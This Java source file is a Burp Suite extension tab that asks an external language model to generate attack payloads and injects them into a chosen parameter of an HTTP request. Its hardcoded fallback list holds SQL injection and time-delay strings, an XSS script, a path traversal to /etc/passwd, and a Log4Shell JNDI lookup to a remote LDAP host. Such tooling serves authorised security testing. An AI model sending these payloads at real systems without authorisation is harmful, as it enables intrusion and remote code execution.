package com.example.apexbounty;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class LLMFuzzerTab {

    private final MontoyaApi api;
    private final JPanel panel;
    private final JCheckBox chkEnableLlm;
    private final JPasswordField txtApiKey;
    private final JTextField txtModel;
    private final JTextField txtApiUrl;
    private final JComboBox<String> comboParams;
    private final JButton btnFuzz;
    private final DefaultTableModel resultsTableModel;

    private final HttpRequestEditor reqEditor;
    private final HttpResponseEditor respEditor;

    private HttpRequest currentRequest;
    private List<ApexToolkitLogic.LLMFuzzerEngine.ParamInfo> extractedParams = new ArrayList<>();
    private final List<FuzzRecord> fuzzResults = new CopyOnWriteArrayList<>();

    private static class FuzzRecord {
        final String payload;
        final String status;
        final String length;
        final HttpResponse response;

        FuzzRecord(String payload, String status, String length, HttpResponse response) {
            this.payload = payload;
            this.status = status;
            this.length = length;
            this.response = response;
        }
    }

    public LLMFuzzerTab(MontoyaApi api) {
        this.api = api;
        this.panel = new JPanel(new BorderLayout());

        // Top Configuration Panel
        JPanel configPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 5));

        chkEnableLlm = new JCheckBox("Enable External LLM Call", false);
        configPanel.add(chkEnableLlm);

        configPanel.add(new JLabel("API Key:"));
        txtApiKey = new JPasswordField("", 12);
        configPanel.add(txtApiKey);

        configPanel.add(new JLabel("Model:"));
        txtModel = new JTextField("gpt-3.5-turbo", 10);
        configPanel.add(txtModel);

        configPanel.add(new JLabel("Endpoint:"));
        txtApiUrl = new JTextField("https://api.openai.com/v1/chat/completions", 20);
        configPanel.add(txtApiUrl);

        configPanel.add(new JLabel("Target Param:"));
        comboParams = new JComboBox<>();
        comboParams.setPreferredSize(new Dimension(140, 25));
        configPanel.add(comboParams);

        btnFuzz = new JButton("Generate Payloads & Fuzz");
        btnFuzz.addActionListener(e -> onGenerateAndFuzz());
        configPanel.add(btnFuzz);

        // Editors
        reqEditor = api.userInterface().createHttpRequestEditor();
        respEditor = api.userInterface().createHttpResponseEditor();

        JPanel reqPanel = new JPanel(new BorderLayout());
        reqPanel.add(new JLabel(" Base Request"), BorderLayout.NORTH);
        reqPanel.add(reqEditor.uiComponent(), BorderLayout.CENTER);

        // Results Table
        resultsTableModel = new DefaultTableModel(new Object[]{"Payload", "Status", "Content Length"}, 0);
        JTable resultsTable = new JTable(resultsTableModel);
        resultsTable.getSelectionModel().addListSelectionListener(e -> {
            if (e.getValueIsAdjusting()) return;
            int row = resultsTable.getSelectedRow();
            if (row >= 0 && row < fuzzResults.size()) {
                FuzzRecord rec = fuzzResults.get(row);
                if (rec.response != null) {
                    respEditor.setResponse(rec.response);
                }
            }
        });

        JScrollPane resScroll = new JScrollPane(resultsTable);

        JSplitPane rightSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, resScroll, respEditor.uiComponent());
        rightSplit.setResizeWeight(0.5);

        JSplitPane mainSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqPanel, rightSplit);
        mainSplit.setResizeWeight(0.4);

        panel.add(configPanel, BorderLayout.NORTH);
        panel.add(mainSplit, BorderLayout.CENTER);
    }

    public Component getComponent() {
        return panel;
    }

    public void setTargetRequest(HttpRequest request) {
        if (request == null) return;

        this.currentRequest = request;
        reqEditor.setRequest(request);

        extractedParams = ApexToolkitLogic.LLMFuzzerEngine.extractParameters(request);

        SwingUtilities.invokeLater(() -> {
            comboParams.removeAllItems();
            if (!extractedParams.isEmpty()) {
                for (ApexToolkitLogic.LLMFuzzerEngine.ParamInfo p : extractedParams) {
                    comboParams.addItem(p.getName() + " (" + p.getType() + ")");
                }
            } else {
                comboParams.addItem("No Params Found");
            }
        });
    }

    private void onGenerateAndFuzz() {
        if (currentRequest == null) {
            JOptionPane.showMessageDialog(panel, "Please set a target request first.");
            return;
        }

        int selectedIdx = comboParams.getSelectedIndex();
        String paramName;
        if (selectedIdx >= 0 && selectedIdx < extractedParams.size()) {
            paramName = extractedParams.get(selectedIdx).getName();
        } else {
            paramName = String.valueOf(comboParams.getSelectedItem());
        }

        String apiKey = new String(txtApiKey.getPassword()).trim();
        String modelName = txtModel.getText().trim();
        String apiUrl = txtApiUrl.getText().trim();
        boolean useExternalLlm = chkEnableLlm.isSelected();

        btnFuzz.setEnabled(false);
        resultsTableModel.setRowCount(0);
        fuzzResults.clear();

        Thread t = new Thread(() -> fuzzWorkerThread(paramName, apiKey, modelName, apiUrl, useExternalLlm));
        t.setDaemon(true);
        t.start();
    }

    private void fuzzWorkerThread(String paramName, String apiKey, String modelName, String apiUrl, boolean useExternalLlm) {
        try {
            List<String> payloads = new ArrayList<>();

            if (useExternalLlm && !apiKey.isEmpty()) {
                payloads = callLlmApi(paramName, currentRequest.toString(), apiKey, modelName, apiUrl);
            }

            if (payloads.isEmpty()) {
                payloads = java.util.Arrays.asList(
                        "' OR '1'='1",
                        "\" OR \"1\"=\"1",
                        "<script>alert('xss')</script>",
                        "../../../../etc/passwd",
                        "${jndi:ldap://eval.com/a}",
                        "'; WAITFOR DELAY '0:0:5'--",
                        "1; SELECT pg_sleep(5)"
                );
            }

            for (String payload : payloads) {
                HttpRequest mutatedReq = ApexToolkitLogic.LLMFuzzerEngine.injectPayload(currentRequest, paramName, payload);

                try {
                    HttpRequestResponse reqResp = api.http().sendRequest(mutatedReq);
                    String status = "N/A";
                    String length = "N/A";

                    HttpResponse resp = reqResp != null ? reqResp.response() : null;
                    if (resp != null) {
                        status = String.valueOf(resp.statusCode());
                        length = String.valueOf(resp.body().length());
                    }

                    FuzzRecord rec = new FuzzRecord(payload, status, length, resp);
                    fuzzResults.add(rec);

                    String sStatus = status;
                    String sLen = length;
                    SwingUtilities.invokeLater(() -> resultsTableModel.addRow(new Object[]{payload, sStatus, sLen}));
                } catch (Exception ex) {
                    String errStatus = "Error: " + ex.getMessage();
                    FuzzRecord rec = new FuzzRecord(payload, errStatus, "0", null);
                    fuzzResults.add(rec);
                    SwingUtilities.invokeLater(() -> resultsTableModel.addRow(new Object[]{payload, errStatus, "0"}));
                }
            }
        } finally {
            SwingUtilities.invokeLater(() -> btnFuzz.setEnabled(true));
        }
    }

    private List<String> callLlmApi(String paramName, String rawReq, String apiKey, String modelName, String apiUrl) {
        String prompt = ApexToolkitLogic.LLMFuzzerEngine.buildPrompt(paramName, rawReq);
        try {
            URL url = new URL(apiUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Authorization", "Bearer " + apiKey);
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            String jsonInput = "{\"model\":\"" + (modelName.isEmpty() ? "gpt-3.5-turbo" : modelName) + "\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":\"" + escapeJson(prompt) + "\"}]," +
                    "\"temperature\":0.7}";

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInput.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder response = new StringBuilder();
                    String responseLine;
                    while ((responseLine = br.readLine()) != null) {
                        response.append(responseLine.trim());
                    }
                    return ApexToolkitLogic.LLMFuzzerEngine.parseLlmPayloads(response.toString());
                }
            }
        } catch (Exception ex) {
            api.logging().logToError("LLM API Call Error: " + ex.getMessage());
        }
        return new ArrayList<>();
    }

    private String escapeJson(String raw) {
        if (raw == null) return "";
        return raw.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\b", "\\b")
                .replace("\f", "\\f")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
